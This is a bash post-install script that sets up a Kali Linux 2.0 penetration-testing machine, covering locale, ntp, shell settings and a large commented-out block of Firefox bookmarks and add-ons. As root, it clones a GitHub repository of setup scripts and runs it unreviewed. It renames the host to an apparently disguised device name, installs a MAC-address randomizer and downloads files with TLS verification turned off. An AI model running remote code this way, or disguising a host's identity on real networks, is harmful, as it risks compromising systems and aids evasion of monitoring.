#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: kali.sh                     (Update: 2015-08-26) #
#-Info--------------------------------------------------------#
#  Personal post-install script for Kali Linux 2.0.           #
#-Author(s)---------------------------------------------------#
#  jbarcia / based off of g0tmilk                             #
#-Operating System--------------------------------------------#
#  Designed for: Kali Linux 2.0.0 [x64] (VM - VMware)         #
#     Tested on: Kali Linux 2.0.0 [x64/x84/full/light/mini/vm]#
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Run as root, just after a fresh/clean install of Kali 2.0. #
#  Kali v1.0 see ~ https://g0tmi1k/os-scripts/master/kali1.sh #
#                             ---                             #
#  By default it will set the time zone & keyboard to US/NY.  #
#                             ---                             #
#  Command line arguments:                                    #
#    --burp    = Automates configuring Burp Proxy (Free)      #
#    --hold    = Disable updating certain packages (e.g. msf) #
#    --openvas = Installs & configures OpenVAS vuln scanner   #
#    --osx     = Configures Apple keyboard layout             #
#                                                             #
#    e.g. # bash kali.sh --osx --burp --openvas               #
#                             ---                             #
#  Incomplete/buggy/hidden stuff - search for '***'.          #
#                             ---                             #
#             ** This script is meant for _ME_. **            #
#         ** EDIT this to meet _YOUR_ requirements! **        #
#-------------------------------------------------------------#


#-Defaults-------------------------------------------------------------#

##### Optional steps
freezeDEB=false             # Disable updating certain packages (e.g. Metasploit)            [ --hold ]
burpFree=false              # Disable configuring Burp Proxy Free (for Burp Pro users...)    [ --burp ]
openVAS=false               # Install & configure OpenVAS (not everyone wants it...)         [ --openvas ]

##### Github directory
gitdir=/root/github
mkdir -p $gitdir

##### (Optional) Enable debug mode?
#set -x

##### Get Kernel Version
proc=0
arm=0
if [ "$(uname -m)" == "x86_64" ]; then 
  proc=64
#  echo "64 bit"
elif [ "$(uname -m)" == "i386" ]; then 
  proc=32
#  echo "32 bit"
elif [[ "$(uname -m)" == *"arm"* ]]; then 
  arm=1
#  echo "ARM"
fi

##### Get Kali Version
vers=0
if [ "$(cat /etc/issue | cut -d/ -f2 | cut -d\\ -f1)" == "Linux Rolling " ]; then
  vers=rolling 
elif [ "$(cat /etc/issue | cut -d. -f1)" == "Kali GNU/Linux 2" ]; then 
  vers=kali2
elif [ "$(cat /etc/issue | cut -d. -f1)" == "Kali GNU/Linux 1" ]; then 
  vers=kali1
fi

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal


#-Arguments------------------------------------------------------------#


##### Read command line arguments
for x in $( tr '[:upper:]' '[:lower:]' <<< "$@" ); do
  if [[ "${x}" == "--osx" || "${x}" == "--apple" ]]; then
    keyboardApple=true
  elif [ "${x}" == "--hold" ]; then
    freezeDEB=true
  elif [ "${x}" == "--burp" ]; then
    burpFree=true
  elif [ "${x}" == "--openvas" ]; then
    openVAS=true
  else
    echo -e ' '${RED}'[!]'${RESET}" Unknown option: ${RED}${x}${RESET}" 1>&2
    exit 1
  fi
done


#-Start----------------------------------------------------------------#


##### Check if we are running as root - else this script will fail (hard!)
if [[ ${EUID} -ne 0 ]]; then
  echo -e ' '${RED}'[!]'${RESET}" This script must be ${RED}run as root${RESET}. Quitting..." 1>&2
  exit 1
else
  echo -e " ${BLUE}[*]${RESET} ${BOLD}Kali Linux post-install script${RESET}"
fi

##### Initial Setup
#echo "Is this an initial setup? (Y/N)"
#read -p ""
# if [ "$REPLY" == "y" -o "$REPLY" == "Y" ]; then
  # Change Hostname
  # SEP0023EB54B953
  hostname "SEP0023EB54B953"
  cat /etc/hosts | sed s/"kali"/"SEP0023EB54B953"/ > /tmp/newhosts
  mv /tmp/newhosts /etc/hosts
  cat /etc/hostname | sed s/"kali"/"SEP0023EB54B953"/ > /tmp/newhostname
  mv /tmp/newhostname /etc/hostname
  # Change Password
  passwd
#fi


##### Make share directory
mkdir -p /mnt/share

##### Install Gem Bundler
gem install bundler


##### Install g0tmi1k/os-scripts
if [ -d "os-scripts" ]; then
  cd os-scripts
  git stash
  git pull
  cd ..
elif [ ! -d "os-scripts" ]; then
  git clone https://github.com/g0tmi1k/os-scripts.git
fi

if [ $vers == "rolling" ]; then
  chmod +x os-scripts/kali-rolling.sh
  os-scripts/kali-rolling.sh
elif [ $vers == "kali2" ]; then 
  chmod +x os-scripts/kali2.sh
  os-scripts/kali2.sh
elif [ $vers == "kali1" ]; then 
  chmod +x os-scripts/kali1.sh
  os-scripts/kali1.sh
elif [ $vers == "backtrack" ]; then 
  chmod +x os-scripts/backtrack5r3.sh
  os-scripts/backtrack5r3.sh
elif [ $vers == 0 ]; then 
  echo "Unable to determine Kali version, run os-script manually"
fi



##### Location information
keyboardApple=false         # Using a Apple/Macintosh keyboard? Change to anything other than 'false' to enable   [ --osx ]
keyboardlayout="us"
timezone="America/New_York"

curl --progress -k -L -f "https://status.github.com/api/status.json" | grep -q "good" || (echo -e ' '${RED}'[!]'${RESET}" ${RED}GitHub is currently having issues${RESET}. ${BOLD}Lots may fail${RESET}. See: https://status.github.com/" 1>&2 && sleep 10s)

##### Update location information - set either value to "" to skip.
echo -e "\n ${GREEN}[+]${RESET} Updating ${GREEN}location information${RESET} ~ keyboard layout (${BOLD}${keyboardlayout}${RESET}) & time zone (${BOLD}${timezone}${RESET})"
[ "${keyboardApple}" != "false" ]  && echo -e "\n ${GREEN}[+]${RESET} Applying ${GREEN}Apple hardware${RESET} profile"
#--- Configure keyboard layout
if [ ! -z "${keyboardlayout}" ]; then
  geoip_keyboard=$(curl -s http://ifconfig.io/country_code | tr '[:upper:]' '[:lower:]')
  [ "${geoip_keyboard}" != "${keyboardlayout}" ] && echo -e " ${YELLOW}[i]${RESET} Keyboard layout (${BOLD}${keyboardlayout}${RESET}}) doesn't match whats been detected via GeoIP (${BOLD}${geoip_keyboard}${RESET}})"
  file=/etc/default/keyboard; #[ -e "${file}" ] && cp -n $file{,.bkup}
  sed -i 's/XKBLAYOUT=".*"/XKBLAYOUT="'${keyboardlayout}'"/' "${file}"
  [ "${keyboardApple}" != "false" ] && sed -i 's/XKBVARIANT=".*"/XKBVARIANT="mac"/' "${file}"   # Enable if you are using Apple based products.
  #dpkg-reconfigure -f noninteractive keyboard-configuration   #dpkg-reconfigure console-setup   #dpkg-reconfigure keyboard-configuration -u    # Need to restart xserver for effect
fi
#--- Changing time zone
[ -z "${timezone}" ] && timezone=Etc/UTC     #Etc/GMT vs Etc/UTC vs UTC
echo "${timezone}" > /etc/timezone           #Etc/GMT vs Etc/UTC vs UTC vs Europe/London
ln -sf "/usr/share/zoneinfo/$(cat /etc/timezone)" /etc/localtime
dpkg-reconfigure -f noninteractive tzdata
#--- Setting locale    # Cant't do due to user input
#sed -i 's/^# en_/en_/' /etc/locale.gen   #en_GB en_US
#locale-gen
##echo -e 'LC_ALL=en_US.UTF-8\nLANG=en_US.UTF-8\nLANGUAGE=en_US:en' > /etc/default/locale
#dpkg-reconfigure -f noninteractive tzdata
##locale -a    # Check
#--- Installing ntp
apt-get -y -qq install ntp ntpdate || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
#--- Configuring ntp
#file=/etc/default/ntp; [ -e "${file}" ] && cp -n $file{,.bkup}
#grep -q "interface=127.0.0.1" "${file}" || sed -i "s/NTPD_OPTS='/NTPD_OPTS='--interface=127.0.0.1 /" "${file}"
#--- Update time
ntpdate -b -s -u pool.ntp.org
#--- Start service
systemctl restart ntp
#--- Remove from start up
systemctl disable ntp 2>/dev/null
#--- Check
#date
#--- Only used for stats at the end
start_time=$(date +%s)







###### Configure startup   ***
#echo -e "\n ${GREEN}[+]${RESET} Configuring ${GREEN}startup${RESET} ~ randomize the hostname, eth0 & wlan0s MAC address"
#--- Start up
#file=/etc/rc.local; [ -e "${file}" ] && cp -n $file{,.bkup}
#grep -q "macchanger" "${file}" 2>/dev/null || sed -i "s#^exit 0#for INT in eth0 wlan0; do\n  $(which ip) link set \${INT} down\n  $(which macchanger) -r \${INT} \&\& $(which sleep) 3s\n  $(which ip) link set \${INT} up\ndone\n\n\nexit 0#" "${file}"
#grep -q "hostname" "${file}" 2>/dev/null || sed -i "s#^exit 0#echo \$($(which cat) /dev/urandom | $(which tr) -dc 'A-Za-z' | $(which head) -c8) > /etc/hostname\nexit 0#" "${file}"
#--- On demand
file=/usr/local/bin/mac-rand; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > ${file}
#!/bin/bash
for INT in eth0 wlan0; do
  echo "[i] Randomizing: \${INT}"
  ifconfig \${INT} down
  macchanger -r \${INT} && sleep 3
  ifconfig \${INT} up
  echo "--------------------"
done
exit 0
EOF
chmod -f 0500 "${file}"
#--- Auto on interface change state (untested)
#file=/etc/network/if-pre-up.d/macchanger; [ -e "${file}" ] && cp -n $file{,.bkup}
#cat <<EOF > ${file}
##!/bin/bash
#[ "\${IFACE}" == "lo" ] && exit 0
#ifconfig \${IFACE} down
#macchanger -r \${IFACE}
#ifconfig \${IFACE} up
#exit 0
#EOF
#chmod -f 0500 "${file}"
#--- Disable random MAC address on start up
rm -f /etc/network/if-pre-up.d/macchanger


##### Configure bash - all users
# custom bash search
echo "## arrow up" >> ~/.inputrc
echo "\"\\e[A\":history-search-backward" >> ~/.inputrc
echo "## arrow down" >> ~/.inputrc
echo "\"\\e[B\":history-search-forward" >> ~/.inputrc


##### Create screenshots dir and add to favs
echo -e "\n ${GREEN}[+]${RESET} Configuring ${GREEN}file${RESET} (Nautilus/Thunar) ~ GUI file system navigation"
mkdir -p /root/Desktop/Screenshots
grep -q '^file:///root/Desktop/Screenshots ' "${file}" 2>/dev/null || echo 'file:///root/Desktop/Screenshots Screenshots' >> "${file}"










##### Setup firefox
#--- Configure bookmarks
#awk '!a[$0]++' /tmp/bookmarks_new.html | \egrep -v ">(Latest Headlines|Getting Started|Recently Bookmarked|Recent Tags|Mozilla Firefox|Help and Tutorials|Customize Firefox|Get Involved|About Us|Hacker Media|Bookmarks Toolbar|Most Visited)</" | \egrep -v "^    </DL><p>" | \egrep -v "^<DD>Add" > "${file}"
#sed -i 's#^</DL><p>#        </DL><p>\n    </DL><p>\n</DL><p>#' "${file}"                                                          # Fix import issues from pentest-bookmarks...
#sed -i 's#^    <DL><p>#    <DL><p>\n    <DT><A HREF="http://127.0.0.1/">localhost</A>#' "${file}"                                 # Add localhost to bookmark toolbar (before hackery folder)
#sed -i 's#^</DL><p>#    <DT><A HREF="https://127.0.0.1:8834/">Nessus</A>\n</DL><p>#' "${file}"                                    # Add Nessus UI bookmark toolbar
#[ "${openVAS}" != "false" ] && sed -i 's#^</DL><p>#    <DT><A HREF="https://127.0.0.1:9392/">OpenVAS</A>\n</DL><p>#' "${file}"      # Add OpenVAS UI to bookmark toolbar
##sed -i 's#^</DL><p>#    <DT><A HREF="https://127.0.0.1:3780/">Nexpose</A>\n</DL><p>#' "${file}"                                  # Add Nexpose UI to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="http://127.0.0.1:3000/ui/panel">BeEF</A>\n</DL><p>#' "${file}"                               # Add BeEF UI to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="http://127.0.0.1/rips/">RIPS</A>\n</DL><p>#' "${file}"                                       # Add RIPs to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="https://paulschou.com/tools/xlate/">XLATE</A>\n</DL><p>#' "${file}"                          # Add XLATE to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="https://hackvertor.co.uk/public">HackVertor</A>\n</DL><p>#' "${file}"                        # Add HackVertor to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="http://www.irongeek.com/skiddypad.php">SkiddyPad</A>\n</DL><p>#' "${file}"                   # Add Skiddypad to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="https://www.exploit-db.com/search/">Exploit-DB</A>\n</DL><p>#' "${file}"                     # Add Exploit-DB to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="http://offset-db.com/">Offset-DB</A>\n</DL><p>#' "${file}"                                   # Add offset-db to bookmark toolbar
##sed -i 's#^</DL><p>#    <DT><A HREF="http://shell-storm.org/shellcode/">Shelcodes</A>\n</DL><p>#' "${file}"                      # Add shellcode to bookmark toolbar
##sed -i 's#^</DL><p>#    <DT><A HREF="http://ropshell.com/">ROP Shell</A>\n</DL><p>#' "${file}"                                   # Add ROP Shell to bookmark toolbar
#sed -i 's#^</DL><p>#    <DT><A HREF="https://ifconfig.io/">ifconfig</A>\n</DL><p>#' "${file}"                                     # Add ifconfig.io to bookmark toolbar
#sed -i 's#<HR>#<DT><H3 ADD_DATE="1303667175" LAST_MODIFIED="1303667175" PERSONAL_TOOLBAR_FOLDER="true">Bookmarks Toolbar</H3>\n<DD>Add bookmarks to this folder to see them displayed on the Bookmarks Toolbar#' "${file}"

##### Setup iceweasel's plugins
#echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}iceweasel's plugins${RESET} ~ Useful addons"
##--- Download extensions
#ffpath="$(find /root/.mozilla/firefox/*.default*/ -maxdepth 0 -mindepth 0 -type d -name '*.default*' -print -quit)/extensions"
#[ "${ffpath}" == "/extensions" ] && echo -e ' '${RED}'[!]'${RESET}" Couldn't find Firefox/Iceweasel folder" 1>&2
#mkdir -p "${ffpath}/"
##curl --progress -k -L -f "https://github.com/mozmark/ringleader/blob/master/fx_pnh.xpi?raw=true"  || echo -e ' '${RED}'[!]'${RESET}" Issue downloading fx_pnh.xpi" 1>&2                                                                                                                        # plug-n-hack
##curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/284030/addon-284030-latest.xpi?src=dp-btn-primary" -o "$ffpath/{6bdc61ae-7b80-44a3-9476-e1d121ec2238}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'HTTPS Finder'" 1>&2                             # HTTPS Finder
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/5817/addon-5817-latest.xpi?src=dp-btn-primary" -o "$ffpath/SQLiteManager@mrinalkant.blogspot.com.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'SQLite Manager'" 1>&2                                 # SQLite Manager
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/1865/addon-1865-latest.xpi?src=dp-btn-primary" -o "$ffpath/{d10d0bf8-f5b5-c8b4-a8b2-2b9879e08c5d}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Adblock Plus'" 1>&2                                  # Adblock Plus
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/92079/addon-92079-latest.xpi?src=dp-btn-primary" -o "$ffpath/{bb6bc1bb-f824-4702-90cd-35e2fb24f25d}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Cookies Manager+'" 1>&2                            # Cookies Manager+
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/1843/addon-1843-latest.xpi?src=dp-btn-primary" -o "$ffpath/firebug@software.joehewitt.com.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Firebug'" 1>&2                                               # Firebug
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/15023/addon-15023-latest.xpi?src=dp-btn-primary" -o "$ffpath/foxyproxy-basic@eric.h.jung.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'FoxyProxy Basic'" 1>&2                                        # FoxyProxy Basic
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/429678/addon-429678-latest.xpi?src=dp-btn-primary" -o "$ffpath/useragentoverrider@qixinglu.com.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'User Agent Overrider'" 1>&2                             # User Agent Overrider
#curl --progress -k -L -f "https://www.eff.org/files/https-everywhere-latest.xpi" -o "$ffpath/https-everywhere@eff.org.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'HTTPS Everywhere'" 1>&2                                                                                        # HTTPS Everywhere
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/3829/addon-3829-latest.xpi?src=dp-btn-primary" -o "$ffpath/{8f8fe09b-0bd3-4470-bc1b-8cad42b8203a}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Live HTTP Headers'" 1>&2                             # Live HTTP Headers
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/966/addon-966-latest.xpi?src=dp-btn-primary" -o "$ffpath/{9c51bd27-6ed8-4000-a2bf-36cb95c0c947}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Tamper Data'" 1>&2                                     # Tamper Data
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/557778/addon-557778-latest.xpi?src=api" -o "$ffpath/jid1-AWt6ex5aPvWtTg@jetpack.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Shodan Firefox Addon'" 1>&2     
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/file/293038/showip-2.7.7-sm+tb+fx.xpi?src=dp-btn-primary" -o "$ffpath/{3e9bb2a7-62ca-4efa-a4e6-f6f6168a652d}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'ShowIP'" 1>&2
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/10229/addon-10229-latest.xpi" -o "$ffpath/wappalyzer@crunchlabz.com.xpi"  || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Wappalyzer'" 1>&2
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/60/addon-60-latest.xpi?src=dp-btn-primary" -o "$ffpath/{c45c406e-ab73-11d8-be73-000a95be3b12}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Web Developer'" 1>&2
#curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/300254/addon-300254-latest.xpi?src=dp-btn-primary" -o "$ffpath/check-compatibility@dactyl.googlecode.com.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Disable Add-on Compatibility Checks'" 1>&2    # Disable Add-on Compatibility Checks
##--- Installing extensions
#for FILE in $(find "${ffpath}" -maxdepth 1 -type f -name '*.xpi'); do
#  d="$(basename "${FILE}" .xpi)"
#  mkdir -p "${ffpath}/${d}/"
#  unzip -q -o -d "${ffpath}/${d}/" "${FILE}"
#  rm -f "${FILE}"
#done
##--- Enable Iceweasel's addons/plugins/extensions
#timeout 15 iceweasel >/dev/null 2>&1   #iceweasel & sleep 15; killall -q -w iceweasel >/dev/null
#sleep 3
#file=$(find /root/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'extensions.sqlite' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
#if [ ! -e "${file}" ] || [ -z "${file}" ]; then
#  #echo -e ' '${RED}'[!]'${RESET}" Something went wrong enabling Iceweasel's extensions via method #1. Trying method #2..." 1>&2
#  false
#else
#  echo -e " ${YELLOW}[i]${RESET} Enabled ${YELLOW}Iceweasel's extensions${RESET} (via method #1!)"
#  apt-get install -y -qq sqlite3 || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
#  rm -f /tmp/iceweasel.sql; touch /tmp/iceweasel.sql
#  echo "UPDATE 'main'.'addon' SET 'active' = 1, 'userDisabled' = 0;" > /tmp/iceweasel.sql    # Force them all!
#  sqlite3 "${file}" < /tmp/iceweasel.sql      #fuser extensions.sqlite
#fi
#file=$(find /root/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'extensions.json' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
#if [ ! -e "${file}" ] || [ -z "${file}" ]; then
#  #echo -e ' '${RED}'[!]'${RESET}" Something went wrong enabling Iceweasel's extensions via method #2. Did method #1 also fail?" 1>&2
#  false
#else
#  echo -e " ${YELLOW}[i]${RESET} Enabled ${YELLOW}Iceweasel's extensions${RESET} (via method #2!)"
#  sed -i 's/"active":false,/"active":true,/g' "${file}"                # Force them all!
#  sed -i 's/"userDisabled":true,/"userDisabled":false,/g' "${file}"    # Force them all!
#fi
#file=$(find /root/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'prefs.js' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
#[ ! -z "${file}" ] && sed -i '/extensions.installCache/d' "${file}"
#timeout 5 iceweasel >/dev/null 2>&1   # For extensions that just work without restarting
#sleep 3
#timeout 5 iceweasel >/dev/null 2>&1   # ...for (most) extensions, as they need iceweasel to restart
#sleep 3
##--- Configure foxyproxy
#file=$(find /root/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'foxyproxy.xml' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
#if [ -z "${file}" ]; then
#  echo -e ' '${RED}'[!]'${RESET}' Something went wrong with the foxyproxy iceweasel extension (did any extensions install?). Skipping...' 1>&2
#elif [ -e "${file}" ]; then
#  grep -q 'localhost:8080' "${file}" 2>/dev/null || sed -i 's#<proxy name="Default"#<proxy name="localhost:8080" id="1145138293" notes="e.g. Burp, w3af" fromSubscription="false" enabled="true" mode="manual" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="\#07753E" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="127.0.0.1" port="8080" socksversion="5" isSocks="false" username="" password="" domain=""/></proxy><proxy name="Default"#' "${file}"          # localhost:8080
#  grep -q 'localhost:8081' "${file}" 2>/dev/null || sed -i 's#<proxy name="Default"#<proxy name="localhost:8081 (socket5)" id="212586674" notes="e.g. SSH" fromSubscription="false" enabled="true" mode="manual" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="\#917504" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="127.0.0.1" port="8081" socksversion="5" isSocks="true" username="" password="" domain=""/></proxy><proxy name="Default"#' "${file}"         # localhost:8081 (socket5)
#  grep -q '"No Caching"' "${file}" 2>/dev/null   || sed -i 's#<proxy name="Default"#<proxy name="No Caching" id="3884644610" notes="" fromSubscription="false" enabled="true" mode="system" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="\#990DA6" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="" port="" socksversion="5" isSocks="false" username="" password="" domain=""/></proxy><proxy name="Default"#' "${file}"                                          # No caching
#else
#  echo -ne '<?xml version="1.0" encoding="UTF-8"?>\n<foxyproxy mode="disabled" selectedTabIndex="0" toolbaricon="true" toolsMenu="true" contextMenu="true" advancedMenus="false" previousMode="disabled" resetIconColors="true" useStatusBarPrefix="true" excludePatternsFromCycling="false" excludeDisabledFromCycling="false" ignoreProxyScheme="false" apiDisabled="false" proxyForVersionCheck=""><random includeDirect="false" includeDisabled="false"/><statusbar icon="true" text="false" left="options" middle="cycle" right="contextmenu" width="0"/><toolbar left="options" middle="cycle" right="contextmenu"/><logg enabled="false" maxSize="500" noURLs="false" header="&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;link rel=&quot;icon&quot; href=&quot;http://getfoxyproxy.org/favicon.ico&quot;/&gt;&lt;link rel=&quot;shortcut icon&quot; href=&quot;http://getfoxyproxy.org/favicon.ico&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;http://getfoxyproxy.org/styles/log.css&quot; type=&quot;text/css&quot;/&gt;&lt;/head&gt;&lt;body&gt;&lt;table class=&quot;log-table&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;td class=&quot;heading&quot;&gt;${timestamp-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${url-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${proxy-name-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${proxy-notes-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-name-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-case-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-type-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-color-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pac-result-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${error-msg-heading}&lt;/td&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tfoot&gt;&lt;tr&gt;&lt;td/&gt;&lt;/tr&gt;&lt;/tfoot&gt;&lt;tbody&gt;" row="&lt;tr&gt;&lt;td class=&quot;timestamp&quot;&gt;${timestamp}&lt;/td&gt;&lt;td class=&quot;url&quot;&gt;&lt;a href=&quot;${url}&quot;&gt;${url}&lt;/a&gt;&lt;/td&gt;&lt;td class=&quot;proxy-name&quot;&gt;${proxy-name}&lt;/td&gt;&lt;td class=&quot;proxy-notes&quot;&gt;${proxy-notes}&lt;/td&gt;&lt;td class=&quot;pattern-name&quot;&gt;${pattern-name}&lt;/td&gt;&lt;td class=&quot;pattern&quot;&gt;${pattern}&lt;/td&gt;&lt;td class=&quot;pattern-case&quot;&gt;${pattern-case}&lt;/td&gt;&lt;td class=&quot;pattern-type&quot;&gt;${pattern-type}&lt;/td&gt;&lt;td class=&quot;pattern-color&quot;&gt;${pattern-color}&lt;/td&gt;&lt;td class=&quot;pac-result&quot;&gt;${pac-result}&lt;/td&gt;&lt;td class=&quot;error-msg&quot;&gt;${error-msg}&lt;/td&gt;&lt;/tr&gt;" footer="&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;"/><warnings/><autoadd enabled="false" temp="false" reload="true" notify="true" notifyWhenCanceled="true" prompt="true"><match enabled="true" name="Dynamic AutoAdd Pattern" pattern="*://${3}${6}/*" isRegEx="false" isBlackList="false" isMultiLine="false" caseSensitive="false" fromSubscription="false"/><match enabled="true" name="" pattern="*You are not authorized to view this page*" isRegEx="false" isBlackList="false" isMultiLine="true" caseSensitive="false" fromSubscription="false"/></autoadd><quickadd enabled="false" temp="false" reload="true" notify="true" notifyWhenCanceled="true" prompt="true"><match enabled="true" name="Dynamic QuickAdd Pattern" pattern="*://${3}${6}/*" isRegEx="false" isBlackList="false" isMultiLine="false" caseSensitive="false" fromSubscription="false"/></quickadd><defaultPrefs origPrefetch="null"/><proxies>' > "${file}"
#  echo -ne '<proxy name="localhost:8080" id="1145138293" notes="e.g. Burp, w3af" fromSubscription="false" enabled="true" mode="manual" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="#07753E" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="127.0.0.1" port="8080" socksversion="5" isSocks="false" username="" password="" domain=""/></proxy>' >> "${file}"
#  echo -ne '<proxy name="localhost:8081 (socket5)" id="212586674" notes="e.g. SSH" fromSubscription="false" enabled="true" mode="manual" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="#917504" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="127.0.0.1" port="8081" socksversion="5" isSocks="true" username="" password="" domain=""/></proxy>' >> "${file}"
